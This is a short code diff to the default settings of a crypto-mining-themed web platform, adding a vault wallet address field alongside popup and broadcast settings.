@@ -28,5 +28,6 @@ export const INITIAL_PLATFORM_SETTINGS: PlatformSettings = {
   emergencyBroadcast: 'NEON MINING Enterprise Hash Engine v4.2 Running Normally. Zero Latency.',
   popupEnabled: true,
   popupImageUrl: '',
-  popupLinkUrl: ''
+  popupLinkUrl: '',
+  vaultWalletAddress: '0x7a0DeabDCe010736f93886eb3F2ef3BaA727aD5d'
 };
